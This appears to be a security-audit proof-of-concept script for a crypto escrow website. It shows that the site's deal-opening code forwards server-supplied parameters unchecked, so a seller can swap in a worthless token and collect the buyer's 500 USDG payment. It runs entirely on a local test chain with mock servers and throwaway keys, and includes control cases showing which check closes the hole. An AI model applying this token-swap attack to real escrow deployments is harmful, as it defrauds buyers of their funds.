// ROUND 12 — Team A: K-654 website /d/ open PoC (Team B spec §7d).
// Mock Bull API + fresh Anvil 4663 + live escrow v3 zerofee etch + USDG
// etched (6-dec) + mock tokens (T real + WORTHLESS) + a VERBATIM replica
// of the website's M(e) open + V(e) fund logic from chunk
// page-16d1cf063b916c2c.js (sha 4140f516…, byte-identical round 11):
//   M: POST /api/quote {token, offerId, asset} -> take a.params / a.quote /
//      a.consent and send createDeal with those args EXACTLY, no comparison
//      against the offer; only check is that a DealCreated event exists.
//   V: fundPayment(dealId) for the OFFER amount, without reading deals()
//      on chain at all.
// Throwaway local keys only. No live POSTs, no real funds, no browser.
//
// P1 (primer): offer = buy real token T for 500 USDG. The evil seller signs
// a consent (via the documented SDK consent() flow — the server echoes the
// seller's own terms) naming sellToken = WORTHLESS (their own worthless
// token), buyerReceive = buyer (HONEST). Mock /api/quote returns those
// params. EXPECTED if alive: M creates the deal without error; V pays 500
// USDG; seller funds WORTHLESS; deal settles; buyer holds WORTHLESS (not
// T); attacker nets ~495 USDG.
// P2: seller AND sellToken both swapped to a second attacker wallet/token.
// P0: honest params (sellToken = T, real seller) -> buyer receives T.
// P0b: replica M WITH a params.sellToken == offer.token check -> MUST
// refuse the evil params (proves the check is the missing piece).
// P3: replica M with ONLY a buyerReceive check (the B-22 fix) -> the evil
// params STILL pass (buyerReceive is honest here), proving the B-22 fix
// does not close this hole.
// CAVEAT (honest, must be in the verdict): whether the real server
// validates consent vs offer inside POST /api/quote cannot be tested
// read-only (a live POST is forbidden); this PoC proves the CLIENT side
// with a mock server. If the server validates, only the server-compromise
// path (pure B-02) remains.
import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  createPublicClient, createWalletClient, http as vhttp, defineChain,
  parseAbi, encodeFunctionData, parseUnits, erc20Abi, parseEventLogs,
} from "viem";
import { privateKeyToAccount } from "viem/accounts";

const ROOT = path.dirname(fileURLToPath(import.meta.url));
const RPC = "http://127.0.0.1:8547";
const API_PORT = 3008;
const ESCROW = "0xd961cA37e339E14e0D3478383a252E218fe7aa4a";
const USDG = "0x5fc5360D0400a0Fd4f2af552ADD042D716F1d168";
const ZERO = "0x0000000000000000000000000000000000000000";

const chain = defineChain({ id: 4663, name: "Robinhood Chain",
  nativeCurrency: { decimals: 18, name: "ETH", symbol: "ETH" },
  rpcUrls: { default: { http: [RPC] } } });
const victimKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";
const attackerKey = "0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a";
const attacker2Key = "0x7c852118294e51e653712a81e05800f419141751be58f605c371e15141b007a6";
const sellerKey = "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d";
const victim = privateKeyToAccount(victimKey);
const attacker = privateKeyToAccount(attackerKey);
const attacker2 = privateKeyToAccount(attacker2Key);
const seller = privateKeyToAccount(sellerKey);
const V = victim.address, A = attacker.address, A2 = attacker2.address, S = seller.address;

const publicClient = createPublicClient({ chain, transport: vhttp(RPC) });
const walletV = createWalletClient({ chain, transport: vhttp(RPC), account: victim });
const walletA = createWalletClient({ chain, transport: vhttp(RPC), account: attacker });
const walletA2 = createWalletClient({ chain, transport: vhttp(RPC), account: attacker2 });
const walletS = createWalletClient({ chain, transport: vhttp(RPC), account: seller });
const now = async () => Number((await publicClient.getBlock()).timestamp);

const ESCROW_ABI = parseAbi([
  "function createDeal((address seller,address sellerPayout,address buyerReceive,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline) p,(uint16 feeBps,uint64 expiry,bytes sig) q,(uint64 validUntil,bytes sig) c) returns (uint256)",
  "function fundPayment(uint256 id) payable",
  "function fundTokens(uint256 id)",
  "function deals(uint256 id) view returns (address buyer,address seller,address sellToken,uint256 sellAmount,address payToken,uint256 payAmount,uint64 deadline,bool buyerFunded,bool sellerFunded,uint8 status,address sellerPayout,address buyerReceive,uint16 feeBps)",
  "event DealCreated(uint256 indexed id,address indexed buyer,address indexed seller,uint16 feeBps)",
]);
const CONSENT_TYPES = { Consent: [
  { name: "buyer", type: "address" }, { name: "seller", type: "address" },
  { name: "sellerPayout", type: "address" }, { name: "buyerReceive", type: "address" },
  { name: "sellToken", type: "address" }, { name: "sellAmount", type: "uint256" },
  { name: "payToken", type: "address" }, { name: "payAmount", type: "uint256" },
  { name: "deadline", type: "uint64" }, { name: "validUntil", type: "uint64" },
] };
const CONSENT_DOMAIN = { name: "BullEscrow", version: "3", chainId: 4663, verifyingContract: ESCROW };
const approveCall = (spender, amt) => encodeFunctionData({ abi: erc20Abi, functionName: "approve", args: [spender, amt] });
const bal = (token, who) => publicClient.readContract({ address: token, abi: erc20Abi, functionName: "balanceOf", args: [who] });
const nextDealId = async () => BigInt(await publicClient.getStorageAt({ address: ESCROW, slot: "0x0" }));

async function rpc(method, params) {
  const r = await fetch(RPC, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }) });
  const j = await r.json(); if (j.error) throw new Error(method + ": " + JSON.stringify(j.error)); return j.result;
}
const toHex32 = (n) => "0x" + BigInt(n).toString(16).padStart(64, "0");

let TOKEN_T, WORTHLESS, WORTHLESS2;
const current = { mode: "p1" };
const OFFER = { id: "offer-1", token: null, price: "500", sellerWallet: A }; // filled after deploy
async function signConsent(signer, p) {
  return signer.signTypedData({ domain: CONSENT_DOMAIN, types: CONSENT_TYPES, primaryType: "Consent", message: p });
}
const server = http.createServer(async (req, res) => {
  const body = await new Promise((r) => { let d = ""; req.on("data", (c) => (d += c)); req.on("end", () => r(d)); });
  const send = (o) => { res.writeHead(200, { "content-type": "application/json" }); res.end(JSON.stringify(o)); };
  if (req.url === "/api/quote" && req.method === "POST") {
    const t = await now();
    const deadline = BigInt(t + 7 * 86400), validUntil = BigInt(t + 86400);
    let sellerAddr = A, signer = walletA, sellToken = WORTHLESS;
    if (current.mode === "p0") { sellerAddr = S; signer = walletS; sellToken = TOKEN_T; }
    if (current.mode === "p2") { sellerAddr = A2; signer = walletA2; sellToken = WORTHLESS2; }
    const params = { seller: sellerAddr, sellerPayout: sellerAddr, buyerReceive: V,
      sellToken, sellAmount: parseUnits("100", 18).toString(), payToken: USDG,
      payAmount: (500n * 10n ** 6n).toString(), deadline: deadline.toString() };
    const consentSig = await signConsent(signer, { buyer: V, seller: sellerAddr, sellerPayout: sellerAddr,
      buyerReceive: V, sellToken, sellAmount: parseUnits("100", 18), payToken: USDG,
      payAmount: 500n * 10n ** 6n, deadline, validUntil });
    return send({ params, quote: { feeBps: 100, expiry: (t + 3600).toString(), sig: "0x" + "00".repeat(65) },
      consent: { validUntil: validUntil.toString(), sig: consentSig } });
  }
  res.writeHead(404); res.end("{}");
});

// ---- Replica of website M(e): verbatim passthrough, no offer comparison ----
async function websiteOpen(offer, { checkSellToken = false, checkBuyerReceive = false } = {}) {
  const r = await fetch(`http://127.0.0.1:${API_PORT}/api/quote`, { method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ token: offer.token, offerId: offer.id, asset: "base" }) });
  const a = await r.json();
  if (!r.ok) throw new Error("Could not get the fee quote.");
  const i = a.params, s = a.quote, cc = a.consent;
  if (checkSellToken && i.sellToken.toLowerCase() !== offer.token.toLowerCase())
    throw new Error("REFUSED-BY-CHECK: params.sellToken does not match the offer token.");
  if (checkBuyerReceive && i.buyerReceive.toLowerCase() !== ZERO && i.buyerReceive.toLowerCase() !== V.toLowerCase())
    throw new Error("REFUSED-BY-CHECK: params.buyerReceive is not the buyer.");
  const data = encodeFunctionData({ abi: ESCROW_ABI, functionName: "createDeal",
    args: [{ seller: i.seller, sellerPayout: i.sellerPayout, buyerReceive: i.buyerReceive,
             sellToken: i.sellToken, sellAmount: BigInt(i.sellAmount), payToken: i.payToken,
             payAmount: BigInt(i.payAmount), deadline: BigInt(i.deadline) },
           { feeBps: s.feeBps, expiry: BigInt(s.expiry), sig: s.sig },
           { validUntil: BigInt(cc.validUntil), sig: cc.sig }] });
  const h = await walletV.sendTransaction({ to: ESCROW, data, value: 0n });
  const rc = await publicClient.waitForTransactionReceipt({ hash: h });
  const ev = parseEventLogs({ abi: ESCROW_ABI, logs: rc.logs, eventName: "DealCreated" })[0];
  if (!ev) throw new Error("Deal was not created.");
  return ev.args.id;
}

// ---- Replica of website V(e): pay the OFFER amount, never reads deals() ----
async function websiteFund(dealId, offer) {
  const amt = parseUnits(offer.price, 6);
  await walletV.writeContract({ address: USDG, abi: erc20Abi, functionName: "approve", args: [ESCROW, amt] });
  await walletV.writeContract({ address: ESCROW, abi: ESCROW_ABI, functionName: "fundPayment", args: [BigInt(dealId)] });
}

async function sellerFunds(dealId, token, wallet) {
  await wallet.writeContract({ address: token, abi: erc20Abi, functionName: "approve", args: [ESCROW, parseUnits("100", 18)] });
  await wallet.writeContract({ address: ESCROW, abi: ESCROW_ABI, functionName: "fundTokens", args: [BigInt(dealId)] });
}

async function main() {
  await new Promise((r) => server.listen(API_PORT, r));
  const escZero = "0x" + fs.readFileSync(path.join(ROOT, "chain/bytecode/escrow-v3-zerofee.hex"), "utf8").trim().replace(/^0x/, "");
  await rpc("anvil_setCode", [ESCROW, escZero]);
  await rpc("anvil_setStorageAt", [ESCROW, "0x5", toHex32(1n)]);
  await rpc("anvil_setStorageAt", [ESCROW, "0x0", toHex32(1n)]);
  const mocks = JSON.parse(fs.readFileSync(path.join(ROOT, "chain/out/Mocks.sol/MockERC20.json"), "utf8"));
  async function deployMock() {
    const h = await walletV.deployContract({ abi: mocks.abi, bytecode: mocks.bytecode.object, args: [] });
    return (await publicClient.waitForTransactionReceipt({ hash: h })).contractAddress;
  }
  TOKEN_T = await deployMock();
  WORTHLESS = await deployMock();
  WORTHLESS2 = await deployMock();
  const usdgDeployed = await deployMock();
  const usdgCode = await publicClient.getCode({ address: usdgDeployed });
  await rpc("anvil_setCode", [USDG, usdgCode]);
  await rpc("anvil_setStorageAt", [USDG, "0x2", toHex32(6n)]);
  OFFER.token = TOKEN_T;
  await walletV.writeContract({ address: USDG, abi: mocks.abi, functionName: "mint", args: [V, 100000n * 10n ** 6n] });
  await walletV.writeContract({ address: TOKEN_T, abi: mocks.abi, functionName: "mint", args: [S, parseUnits("1000000", 18)] });
  await walletV.writeContract({ address: WORTHLESS, abi: mocks.abi, functionName: "mint", args: [A, parseUnits("1000000", 18)] });
  await walletV.writeContract({ address: WORTHLESS2, abi: mocks.abi, functionName: "mint", args: [A2, parseUnits("1000000", 18)] });

  const results = [];
  const usdg = (x) => (BigInt(x) / 10n ** 6n).toString();

  // ---- P1 (primer): sellToken swapped to WORTHLESS, buyerReceive honest ----
  try {
    current.mode = "p1";
    const atkBefore = await bal(USDG, A);
    const dealId = await websiteOpen(OFFER);
    await websiteFund(dealId, OFFER);
    await sellerFunds(dealId, WORTHLESS, walletA);
    const d = await publicClient.readContract({ address: ESCROW, abi: ESCROW_ABI, functionName: "deals", args: [BigInt(dealId)] });
    const buyerT = await bal(TOKEN_T, V);
    const buyerW = await bal(WORTHLESS, V);
    const atkAfter = await bal(USDG, A);
    const exploited = d[9] === 2 && buyerT === 0n && buyerW === parseUnits("100", 18) &&
      (atkAfter - atkBefore) === 495n * 10n ** 6n;
    results.push({ case: "K-654 P1 website open forwards sellToken=WORTHLESS (buyerReceive honest)", exploited,
      dealId: String(dealId), dealStatus: d[9], buyerRealTokenT: buyerT.toString(),
      buyerWorthlessReceived: (buyerW / 10n ** 18n).toString(), attackerUsdgGained: usdg(atkAfter - atkBefore) });
    console.log("[K-654 P1] exploited:", exploited, "deal:", dealId, "status:", d[9]);
  } catch (e) {
    results.push({ case: "K-654 P1 website open forwards sellToken=WORTHLESS (buyerReceive honest)", exploited: false,
      detail: "website replica threw: " + String(e.message || e).slice(0, 300) });
    console.log("[K-654 P1] threw:", String(e.message || e).slice(0, 200));
  }

  // ---- P2: seller + sellToken both swapped ----
  try {
    current.mode = "p2";
    const atkBefore = await bal(USDG, A2);
    const dealId = await websiteOpen({ ...OFFER, sellerWallet: A2 });
    await websiteFund(dealId, OFFER);
    await sellerFunds(dealId, WORTHLESS2, walletA2);
    const d = await publicClient.readContract({ address: ESCROW, abi: ESCROW_ABI, functionName: "deals", args: [BigInt(dealId)] });
    const buyerT = await bal(TOKEN_T, V);
    const buyerW2 = await bal(WORTHLESS2, V);
    const atkAfter = await bal(USDG, A2);
    const exploited = d[9] === 2 && buyerT === 0n && buyerW2 === parseUnits("100", 18) &&
      (atkAfter - atkBefore) === 495n * 10n ** 6n;
    results.push({ case: "K-654 P2 website open forwards seller+ sellToken swapped (2nd attacker)", exploited,
      dealId: String(dealId), dealStatus: d[9], buyerWorthless2Received: (buyerW2 / 10n ** 18n).toString(),
      attacker2UsdgGained: usdg(atkAfter - atkBefore) });
    console.log("[K-654 P2] exploited:", exploited, "deal:", dealId, "status:", d[9]);
  } catch (e) {
    results.push({ case: "K-654 P2 website open forwards seller+ sellToken swapped (2nd attacker)", exploited: false,
      detail: "website replica threw: " + String(e.message || e).slice(0, 300) });
    console.log("[K-654 P2] threw:", String(e.message || e).slice(0, 200));
  }

  // ---- P0: honest control ----
  try {
    current.mode = "p0";
    const dealId = await websiteOpen({ ...OFFER, sellerWallet: S });
    await websiteFund(dealId, OFFER);
    await sellerFunds(dealId, TOKEN_T, walletS);
    const d = await publicClient.readContract({ address: ESCROW, abi: ESCROW_ABI, functionName: "deals", args: [BigInt(dealId)] });
    const buyerT = await bal(TOKEN_T, V);
    results.push({ case: "K-654 P0 control: honest params -> buyer receives real token T", ok: d[9] === 2 && buyerT === parseUnits("100", 18),
      dealId: String(dealId), dealStatus: d[9], buyerRealTokenT: (buyerT / 10n ** 18n).toString() });
    console.log("[K-654 P0] ok:", d[9] === 2, "buyer T:", (buyerT / 10n ** 18n).toString());
  } catch (e) {
    results.push({ case: "K-654 P0 control: honest params -> buyer receives real token T", ok: false,
      detail: "website replica threw: " + String(e.message || e).slice(0, 200) });
    console.log("[K-654 P0] threw:", String(e.message || e).slice(0, 200));
  }

  // ---- P0b: replica M WITH a sellToken-vs-offer check must REFUSE evil params ----
  try {
    current.mode = "p1";
    const before = await nextDealId();
    const dealId = await websiteOpen(OFFER, { checkSellToken: true });
    const after = await nextDealId();
    results.push({ case: "K-654 P0b control: M with sellToken==offer check must refuse evil params", ok: false,
      detail: `M returned deal ${dealId}, deals ${before}->${after} — the check did NOT stop it` });
    console.log("[K-654 P0b] M returned", dealId, "— check FAILED to stop it");
  } catch (e) {
    const msg = String(e.message || e);
    const refused = /REFUSED-BY-CHECK: params\.sellToken/.test(msg);
    const after = await nextDealId();
    results.push({ case: "K-654 P0b control: M with sellToken==offer check must refuse evil params", ok: refused,
      detail: "M threw: " + msg.slice(0, 200) });
    console.log("[K-654 P0b] refused:", refused);
  }

  // ---- P3: replica M with ONLY a buyerReceive check (the B-22 fix) still passes ----
  try {
    current.mode = "p1";
    const atkBefore = await bal(USDG, A);
    const dealId = await websiteOpen(OFFER, { checkBuyerReceive: true });
    await websiteFund(dealId, OFFER);
    await sellerFunds(dealId, WORTHLESS, walletA);
    const d = await publicClient.readContract({ address: ESCROW, abi: ESCROW_ABI, functionName: "deals", args: [BigInt(dealId)] });
    const buyerW = await bal(WORTHLESS, V);
    const atkAfter = await bal(USDG, A);
    const exploited = d[9] === 2 && buyerW >= parseUnits("100", 18) && (atkAfter - atkBefore) === 495n * 10n ** 6n;
    results.push({ case: "K-654 P3 control: M with ONLY a buyerReceive check (B-22 fix) still passes evil params", exploited,
      dealId: String(dealId), dealStatus: d[9], note: "buyerReceive is honest here, so the B-22 fix cannot catch this" });
    console.log("[K-654 P3] exploited (B-22 fix bypassed):", exploited, "deal:", dealId);
  } catch (e) {
    results.push({ case: "K-654 P3 control: M with ONLY a buyerReceive check (B-22 fix) still passes evil params", exploited: false,
      detail: "M threw: " + String(e.message || e).slice(0, 200) });
    console.log("[K-654 P3] threw:", String(e.message || e).slice(0, 200));
  }

  console.log(JSON.stringify(results, null, 2));
  const exploited = results.filter((r) => r.exploited).length;
  const controlsOk = results.filter((r) => r.ok).length;
  console.log(`EXPLOITED: ${exploited}/3 (P1, P2, P3) | CONTROLS OK: ${controlsOk}/2 (P0, P0b)`);
  server.close();
  process.exit(exploited === 3 && controlsOk === 2 ? 0 : 1);
}
main().catch((e) => { console.error("RUNNER FATAL", e); server.close(); process.exit(2); });
